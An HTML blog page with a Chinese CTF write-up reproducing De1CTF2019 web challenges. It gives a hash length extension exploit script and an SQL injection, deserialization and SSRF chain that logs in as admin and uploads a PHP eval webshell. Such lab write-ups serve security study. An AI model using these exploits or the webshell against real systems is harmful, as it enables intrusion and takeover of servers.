@@ -1,0 +1,414 @@
+<!DOCTYPE html>
+<html>
+  
+<head>
+  <meta charset="utf-8">
+  <meta name="author" content="Imtinmin" />
+  
+  
+  <title>De1CTF2019 复现 | Imtinmin的小站</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="CTF,WEB,CTF," />
+  
+
+  
+  <meta name="description" content="Imtinmin的小站">
+
+  
+
+  
+    <script src="//cdn.jsdelivr.net/npm/leancloud-storage@3.11.1/dist/av-min.js" async></script>
+  
+
+  
+    <script type="text/javascript" src="//cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML" async></script>
+  
+
+  
+    <script src="//unpkg.com/valine/dist/Valine.min.js" async></script>
+  
+
+  
+
+  <script>
+  // theme-ad's config script
+  // it can be used in every script
+  
+  window.AD_CONFIG = {
+    leancloud: {"appid":"Hyq9wkH495DgNHWhDQCOfQSp-gzGzoHsz","appkey":"WaR7nrzhliHj9aVwdQzkdlGd","comment":true,"count":true},
+    welcome: {"enable":false,"interval":30},
+    start_time: "2019-10-31",
+    passwords: ["efe07af7441da2b69c4a41e42e73be4db47f66010a56900788a458354a7373ec", ],
+    is_post: true,
+    lock: false,
+    author: "Imtinmin",
+    share: {"twitter":false,"facebook":false,"weibo":false,"qq":false,"wechat":false},
+    mathjax: true,
+    page_type: "",
+    root: "/"
+  };
+</script>
+
+  <script src="/vendor/sha256.min.js"></script>
+<script src="/js/auth.js"></script>
+<script src="/js/index.js"></script>
+<script src="/vendor/qrcode.min.js"></script>
+
+  
+    <link rel="icon" href="/images/favicon.ico">
+    <link rel="apple-touch-icon" href="/images/touch-icon.png">
+  
+
+  <link href="//netdna.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+  <link rel="stylesheet" href="/css/index.css">
+<link rel="stylesheet" href="/styles/components/highlight/highlight.css">
+
+  
+</head>
+  <body>
+    <header class="site-header">
+  <div class="site-header-brand">
+    
+      <span class="site-header-brand-title">
+        <a href="/">Imtinmin</a>
+      </span>
+    
+    
+      <span class="site-header-brand-motto"> | 无知萌新</span>
+    
+  </div>
+  <div class="site-header-right">
+    <nav class="site-header-navigation">
+      
+        <a href="/" target="_self">首页</a>
+      
+        <a href="/archives/" target="_self">归档</a>
+      
+        <a href="/tags/" target="_self">标签</a>
+      
+        <a href="/categories/" target="_self">分类</a>
+      
+        <a href="/friends/" target="_self"></a>
+      
+        <a href="/about/" target="_self"></a>
+      
+    </nav>
+    <div class="site-header-btn">
+      
+        <a href="https://github.com/Imtinmin/" target="_blank" id="site-github">
+          <i class="fa fa-github-alt"></i>
+        </a>
+      
+      <a href="javascript:void(0);" id="site-search">
+        <i class="fa fa-search"></i>
+      </a>
+      <a href="javascript:void(0);" id="site-nav-btn">
+        <i class="fa fa-ellipsis-v"></i>
+      </a>
+    </div>
+  </div>
+</header>
+<nav class="table-content" id="site-nav">
+  <div class="table-content-title">
+    <span>导航</span>
+  </div>
+  <div class="table-content-main">
+    <ol class="toc">
+      
+        <li class="toc-item">
+          <a href="/" target="_self">
+            首页
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/archives/" target="_self">
+            归档
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/tags/" target="_self">
+            标签
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/categories/" target="_self">
+            分类
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/friends/" target="_self">
+            
+          </a>
+        </li>
+      
+        <li class="toc-item">
+          <a href="/about/" target="_self">
+            
+          </a>
+        </li>
+      
+    </ol>
+  </div>
+</nav>
+<div id="site-process"></div>
+    <main>
+      
+  <div class="passage">
+  <div class="passage-meta">
+    <span>
+      <i class="fa fa-calendar"></i>2019-08-08
+    </span>
+    
+      <span>
+        | <a href="/categories/CTF/"><i class="fa fa-bookmark"></i>CTF</a>
+      </span>
+    
+    
+      <span>
+        | <i class="fa fa-unlock-alt"></i>UNLOCK
+      </span>
+    
+  </div>
+  <h1 class="passage-title">
+    De1CTF2019 复现
+  </h1>
+  
+    <div class="passage-cover">
+      <figure style="background-image:url(https://i.loli.net/2019/10/31/byuF3WgIJh7krv5.png);"></figure>
+    </div>
+  
+  <article class="passage-article">
+    <blockquote>
+<p>比赛题目wp 环境:<br><a href="https://github.com/De1ta-team/De1CTF2019/" target="_blank" rel="noopener">https://github.com/De1ta-team/De1CTF2019/</a></p>
+</blockquote>
+<h2 id="SSRFme"><a href="#SSRFme" class="headerlink" title="SSRFme"></a>SSRFme</h2><p>题目地址:<a href="http://139.180.128.86/" target="_blank" rel="noopener">http://139.180.128.86/</a></p>
+<p>审计源码：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action, self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashpumpy</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">url = <span class="string">"http://139.180.128.86"</span></span><br><span class="line">filename = <span class="string">"flag.txt"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">        params = &#123;</span><br><span class="line">                    <span class="string">'param'</span>:filename</span><br><span class="line">                  &#125;</span><br><span class="line">        r = requests.get(url+<span class="string">'/geneSign'</span>,params=params)</span><br><span class="line">        <span class="keyword">print</span> r.text</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">(action,sign,param)</span>:</span></span><br><span class="line">        cookie = &#123;</span><br><span class="line">                    <span class="string">'action'</span>:action,</span><br><span class="line">                    <span class="string">'sign'</span>:sign</span><br><span class="line">                 &#125;</span><br><span class="line">        params = &#123;</span><br><span class="line">                    <span class="string">'param'</span>:param</span><br><span class="line">                 &#125;</span><br><span class="line">        <span class="keyword">print</span> params</span><br><span class="line">        <span class="keyword">print</span> cookie</span><br><span class="line">        r2 = requests.get(url+<span class="string">'/De1ta'</span>,params=params,cookies=cookie)</span><br><span class="line">        <span class="keyword">print</span> r2.text</span><br><span class="line"></span><br><span class="line">hash = hashpumpy.hashpump(geneSign(),<span class="string">'scan'</span>,<span class="string">'read'</span>,<span class="number">24</span>)</span><br><span class="line">sign = hash[<span class="number">0</span>]</span><br><span class="line"><span class="comment">#print sign</span></span><br><span class="line">action = urllib.quote(hash[<span class="number">1</span>])</span><br><span class="line"><span class="comment">#print action</span></span><br><span class="line">challenge(action,sign,filename)</span><br></pre></td></tr></table></figure>
+
+<p>也可以不用哈希扩展攻击<br>参考：<a href="https://xz.aliyun.com/t/5921#toc-16" target="_blank" rel="noopener">https://xz.aliyun.com/t/5921#toc-16</a></p>
+<h2 id="shellshellshell"><a href="#shellshellshell" class="headerlink" title="shellshellshell"></a>shellshellshell</h2><p>原来是原题，复现艰难，阿里云会检测入侵，ban ip<br>源码泄露</p>
+<p>原题：<a href="https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/easy-php-540" target="_blank" rel="noopener">https://github.com/rkmylo/ctf-write-ups/tree/master/2018-n1ctf/web/easy-php-540</a></p>
+<p>跑验证码  ssrf  直接改了用</p>
+<p>captcha.py</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">from itertools import product</span><br><span class="line"></span><br><span class="line">c = &apos;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&amp;*()-_ []&#123;&#125;&lt;&gt;~`+=,.;:/?|&apos;</span><br><span class="line">captchas = [&apos;&apos;.join(i) for i in product(c, repeat=3)]</span><br><span class="line"></span><br><span class="line">print &apos;[+] Genering &#123;&#125; captchas...&apos;.format(len(captchas))</span><br><span class="line">with open(&apos;captchas.txt&apos;, &apos;w&apos;) as f:</span><br><span class="line">    for k in captchas:</span><br><span class="line">        f.write(hashlib.md5(k).hexdigest()+&apos; --&gt; &apos;+k+&apos;\n&apos;)</span><br></pre></td></tr></table></figure>
+
+<p>ssrf_solve.py</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> product</span><br><span class="line"></span><br><span class="line">_target = <span class="string">'http://xx.xx.xx.xx'</span></span><br><span class="line">_action = _target + <span class="string">'index.php?action='</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_creds</span><span class="params">()</span>:</span></span><br><span class="line">    username = <span class="string">''</span>.join(random.choice(string.ascii_lowercase + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>))</span><br><span class="line">    password = <span class="string">''</span>.join(random.choice(string.ascii_lowercase + string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">10</span>))</span><br><span class="line">    <span class="keyword">return</span> username, password</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve_code</span><span class="params">(html)</span>:</span></span><br><span class="line">    code = re.search(<span class="string">r'Code\(substr\(md5\(\?\), 0, 5\) === ([0-9a-f]&#123;5&#125;)\)'</span>, html).group(<span class="number">1</span>)</span><br><span class="line">    solution = subprocess.check_output([<span class="string">'grep'</span>, <span class="string">'^'</span>+code, <span class="string">'captchas.txt'</span>]).split()[<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">return</span> solution</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    resp = sess.get(_action+<span class="string">'register'</span>)</span><br><span class="line">    code = solve_code(resp.text)</span><br><span class="line">    sess.post(_action+<span class="string">'register'</span>, data=&#123;<span class="string">'username'</span>:username,<span class="string">'password'</span>:password,<span class="string">'code'</span>:code&#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(username, password)</span>:</span></span><br><span class="line">    resp = sess.get(_action+<span class="string">'login'</span>)</span><br><span class="line">    code = solve_code(resp.text)</span><br><span class="line">    sess.post(_action+<span class="string">'login'</span>, data=&#123;<span class="string">'username'</span>:username,<span class="string">'password'</span>:password,<span class="string">'code'</span>:code&#125;)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">publish</span><span class="params">(sig, mood)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> sess.post(_action+<span class="string">'publish'</span>, data=&#123;<span class="string">'signature'</span>:sig,<span class="string">'mood'</span>:mood&#125;)<span class="comment">#, proxies=&#123;'http':'127.0.0.1:8080'&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_prc_now</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># date_default_timezone_set("PRC") is not important</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.check_output([<span class="string">'php'</span>, <span class="string">'-r'</span>, <span class="string">'date_default_timezone_set("PRC"); echo time();'</span>])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_admin_session</span><span class="params">()</span>:</span></span><br><span class="line">    sess = requests.Session()</span><br><span class="line">    resp = sess.get(_action+<span class="string">'login'</span>)</span><br><span class="line">    code = solve_code(resp.text)</span><br><span class="line">    <span class="keyword">return</span> sess.cookies.get_dict()[<span class="string">'PHPSESSID'</span>], code</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">brute_filename</span><span class="params">(prefix, ts, sessid)</span>:</span></span><br><span class="line">    ds = [<span class="string">''</span>.join(i) <span class="keyword">for</span> i <span class="keyword">in</span> product(string.digits, repeat=<span class="number">3</span>)]</span><br><span class="line">    ds += [<span class="string">''</span>.join(i) <span class="keyword">for</span> i <span class="keyword">in</span> product(string.digits, repeat=<span class="number">2</span>)]</span><br><span class="line">    <span class="comment"># find uploaded file in max 1100 requests</span></span><br><span class="line">    <span class="keyword">for</span> d <span class="keyword">in</span> ds:</span><br><span class="line">        f = prefix + ts + d + <span class="string">'.jpg'</span></span><br><span class="line">        resp = requests.get(_target+<span class="string">'adminpic/'</span>+f, cookies=&#123;<span class="string">'PHPSESSID'</span>:sessid&#125;)</span><br><span class="line">        <span class="keyword">if</span> resp.status_code == <span class="number">200</span>:</span><br><span class="line">            <span class="keyword">return</span> f</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] creating user session to trigger ssrf'</span></span><br><span class="line">sess = requests.Session()</span><br><span class="line"></span><br><span class="line">username, password = get_creds()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] register(&#123;&#125;, &#123;&#125;)'</span>.format(username, password)</span><br><span class="line">register(username, password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] login(&#123;&#125;, &#123;&#125;)'</span>.format(username, password)</span><br><span class="line">login(username, password)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] user session =&gt; '</span> + sess.cookies.get_dict()[<span class="string">'PHPSESSID'</span>] + <span class="string">' '</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] getting fresh session to be authenticated as admin'</span></span><br><span class="line">phpsessid, code = get_admin_session()</span><br><span class="line"><span class="keyword">print</span> code</span><br><span class="line"></span><br><span class="line">ssrf = <span class="string">'http://127.0.0.1/\x0d\x0aContent-Length:0\x0d\x0a\x0d\x0a\x0d\x0aPOST /index.php?action=login HTTP/1.1\x0d\x0aHost: 127.0.0.1\x0d\x0aCookie: PHPSESSID=&#123;&#125;\x0d\x0aContent-Type: application/x-www-form-urlencoded\x0d\x0aContent-Length: 46\x0d\x0a\x0d\x0ausername=admin&amp;password=jaivypassword&amp;code=&#123;&#125;\x0d\x0a\x0d\x0aPOST /foo\x0d\x0a'</span>.format(phpsessid, code)</span><br><span class="line">mood = <span class="string">'O:10:\"SoapClient\":4:&#123;&#123;s:3:\"uri\";s:&#123;&#125;:\"&#123;&#125;\";s:8:\"location\";s:39:\"http://127.0.0.1/index.php?action=login\";s:15:\"_stream_context\";i:0;s:13:\"_soap_version\";i:1;&#125;&#125;'</span>.format(len(ssrf), ssrf)</span><br><span class="line">mood = <span class="string">'0x'</span>+<span class="string">''</span>.join(map(<span class="keyword">lambda</span> k: hex(ord(k))[<span class="number">2</span>:].rjust(<span class="number">2</span>, <span class="string">'0'</span>), mood))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'a`, &#123;&#125;); -- -'</span>.format(mood)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] final sqli/ssrf payload: '</span> + payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] injecting payload through sqli'</span></span><br><span class="line">resp = publish(payload, <span class="string">'0'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] triggering object deserialization -&gt; ssrf'</span></span><br><span class="line">sess.get(_action+<span class="string">'index'</span>)<span class="comment">#, proxies=&#123;'http':'127.0.0.1:8080'&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] admin session =&gt; '</span> + phpsessid</span><br><span class="line"></span><br><span class="line"><span class="comment"># switching to admin session</span></span><br><span class="line">sess = requests.Session()</span><br><span class="line">sess.cookies = requests.utils.cookiejar_from_dict(&#123;<span class="string">'PHPSESSID'</span>: phpsessid&#125;)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+] uploading stager'</span></span><br><span class="line">shell = &#123;<span class="string">'pic'</span>: (<span class="string">'tinmin.php'</span>, <span class="string">'&lt;?php eval($_POST[tinmin]);'</span>, <span class="string">'image/jpeg'</span>)&#125;</span><br><span class="line">resp = sess.post(_action+<span class="string">'publish'</span>, files=shell)<span class="comment">#, proxies=&#123;'http':'127.0.0.1:8080'&#125;)</span></span><br><span class="line">print(resp.text)</span><br><span class="line">prc_now = get_prc_now()[:<span class="number">-1</span>]  <span class="comment"># get epoch immediately</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">'upload success'</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'[-] failed to upload shell, check admin session manually'</span></span><br><span class="line">    sys.exit(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>说flag在内网</p>
